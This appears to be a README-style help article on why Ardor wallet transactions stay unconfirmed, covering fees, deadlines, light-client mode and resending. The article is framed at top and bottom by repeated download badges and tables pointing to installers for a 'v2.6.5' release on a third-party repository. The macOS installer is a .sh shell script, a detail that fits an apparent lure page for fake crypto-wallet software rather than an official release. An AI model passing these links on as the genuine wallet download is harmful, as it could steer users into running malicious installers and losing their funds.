![Ardor Wallet guide](assets/banner-article.png)

# Why an Ardor transaction stays unconfirmed

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

An Ardor transaction stays unconfirmed when its fee is below what the network is currently accepting, when its deadline passes before a forger includes it, or when it was never broadcast at all - which is what happens in light-client mode. None of those cases loses funds, and each has a different fix.

## What unconfirmed means

A transaction becomes unconfirmed the moment it is broadcast: it exists, it is signed, and nodes are holding it while they wait to include it in a block. It has not changed any [balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) yet, and it will not until a forger puts it in a block and the block is accepted.

That state is normal for seconds or minutes. It becomes a problem when it lasts longer than the deadline the transaction carries, because after that point it is no longer eligible and simply disappears from the pool rather than confirming later.

## The four causes

| What you see | Cause | What it means |
|---|---|---|
| Stuck for minutes, then confirms | Ordinary block timing | Nothing to do |
| Stuck, then vanishes | Deadline expired before inclusion | The transfer did not happen; send again |
| Stuck with a very low fee | Fee below the current market | It may never confirm before the deadline |
| Never appears anywhere, not even as pending | Never broadcast, which light mode can cause | The transfer did not happen; resend from a full client |

The last row is the one people misread as theft. In light-client mode a send can be accepted by the interface and never reach the network, so the wallet shows a transaction the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) has never heard of.

## Check the deadline first

Every transaction carries a deadline, and after it passes the transaction is invalid regardless of its fee. A transaction that has disappeared from the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md)'s pending list has most likely expired rather than confirmed.

Look at the transaction detail for its status and its deadline. If the deadline is in the past and there is no confirmation, the transfer did not happen, and the balance is exactly as it was.

## Fees and the calculate button

The wallet can compute a fee for the current conditions, and using it is the simplest way to avoid the second row of the table. A fee chosen to be as small as possible is a bet that the network stays quiet until your transaction is included.

That bet sometimes wins. When it loses, the transaction waits, and a wait that outlasts the deadline turns into a resend with a better fee - which is a slower outcome than paying the calculated fee once.

## What to do with a stuck transaction

1. Check whether it is pending in the wallet and whether it appears on a block explorer. A transaction the explorer has never seen was not broadcast.
2. Look at the deadline. If it has passed, the transaction is void and can be forgotten.
3. If it is still pending with time left, wait rather than resending. Sending a second transfer to the same recipient risks paying twice.
4. If it is void, send again with a calculated fee.
5. If it never appears at all, switch to the full client and send from there.

Step three is the one that costs people money, and it is also the step people skip when they are anxious. A transfer that is merely slow is not a transfer that failed, and a duplicate send is a real payment rather than a fix.

If you are unsure whether the first transfer is still capable of confirming, wait for its deadline rather than guessing. A deadline is a fixed point, and passing it settles the question without any judgement call about network conditions.

## What the wallet shows versus the chain

The wallet's transaction list is a local view, refreshed from whichever [node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) it is talking to. A transaction can appear there while the network has never seen it - the light-client case - and it can be missing there while the chain already has it confirmed.

When the two disagree, the chain wins. That is why the explorer check is the second step of every diagnosis, and why a support ticket built from a wallet screenshot alone is usually missing the one fact that settles the question.

## When a fee is genuinely too low

A low fee is not a moral failing; it is a bid. If the network is quiet, a low bid wins and the transaction confirms. If activity rises before the deadline, the bid loses and the transaction waits or expires.

The calculate button exists because the bid is a moving target. Using it is not an overpay; it is reading the market instead of guessing at it, and it is why the same transfer can cost different amounts on two different days.

## Prevention

Use the calculated fee unless you have a reason not to. Keep the wallet current, because fee handling and transaction validation are among the things a release changes. Run a full client if you send regularly, so the silent non-broadcast case cannot happen to you at the moment it matters most.

And keep a note of the transaction ID when you send. It is the one piece of evidence that lets you check the chain directly instead of guessing from the wallet's list, and it is what turns a support conversation into a lookup.

## FAQ

### Does an unconfirmed transaction mean my funds are gone?

No. Until it confirms, no balance has changed. If it expires, nothing happened at all.

### Can I cancel a pending transaction?

Not directly. If it is still valid it may confirm; if its deadline passes, it becomes void on its own.

### Why does the explorer not show my transaction?

Because it was never broadcast. Light-client mode can produce that, and resending from a full client is the fix.

### Should I resend with a higher fee?

Only after confirming the first transaction is void. Resending a still-valid transaction can result in two payments.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Send ARDR to an exchange, clear a malformed recipient, and trace a missing deposit](https://github.com/ardor-software/ardor-wallet-guides/blob/main/send-ardr-from-ardor-wallet-to-an-exchange.md)
- [Ardor light client or full node: choose before you start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Why the Ardor wallet shows a zero balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
